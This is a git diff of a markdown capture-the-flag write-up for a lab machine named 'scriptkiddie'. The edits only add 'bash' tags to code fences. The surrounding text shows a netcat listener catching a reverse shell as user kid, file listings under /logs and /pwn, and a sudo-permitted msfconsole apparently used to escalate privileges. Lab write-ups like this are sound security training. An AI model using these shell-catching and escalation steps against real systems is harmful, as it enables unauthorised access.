@@ -81,7 +81,7 @@ on kali
 `nc -lnvp 1234`
 
 ## shell as kid
-```
+```bash
 nc -lnvp 1234        
 listening on [any] 1234 ...
 connect to [10.10.14.44] from (UNKNOWN) [10.129.95.150] 41102
@@ -121,14 +121,14 @@ Type "help", "copyright", "credits" or "license" for more information.
 
 ### /logs
 there is a file called hackers
-```
+```bash
 -rw-rw-r--  1 kid pwn    0 Feb 19 12:33 hackers
 ```
 there is pwn?
 
 ### /pwn
 recon file and scanlosers.sh
-```
+```bash
 drwxrw---- 2 pwn  pwn  4096 Feb 19 12:50 recon
 -rwxrwxr-- 1 pwn  pwn   250 Jan 28  2021 scanlosers.sh
 ```
@@ -208,7 +208,7 @@ User pwn may run the following commands on scriptkiddie:
 ```
 
 ### metasploit
-```
+```bash
 sudo /opt/metasploit-framework-6.0.9/msfconsole
 ```
 
